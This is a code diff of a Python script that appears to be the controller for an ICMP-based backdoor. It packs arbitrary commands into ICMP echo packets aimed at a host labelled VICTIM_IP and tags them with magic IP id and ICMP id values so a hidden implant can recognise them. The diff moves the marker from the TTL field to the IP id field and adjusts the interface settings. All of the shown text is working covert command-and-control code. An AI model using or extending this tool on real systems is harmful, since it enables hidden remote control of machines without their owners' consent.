@@ -5,13 +5,14 @@ from sys import argv
 import threading
 from time import sleep
 
+# Modify below vars as needed
 VICTIM_IP = "10.42.2.15"
-IF_NAME = "enp0s3"
+IF_NAME = "enp0s3" # ens160 also common
 
 SRC_IP = popen("ip -4 addr show " + IF_NAME + " | awk '/inet /{print $2}' | cut -d'/' -f1").read().strip()
 
 def send_command(victim_ip, command, force):
-    pkt = IP(src=SRC_IP, dst=victim_ip, ttl=(45 if not force else 31)) /\
+    pkt = IP(src=SRC_IP, dst=victim_ip, id=(6751 if not force else 31)) /\
         ICMP(type=8, id=6751, seq=1) /\
         Raw(load=command)
     send(pkt, verbose=False)
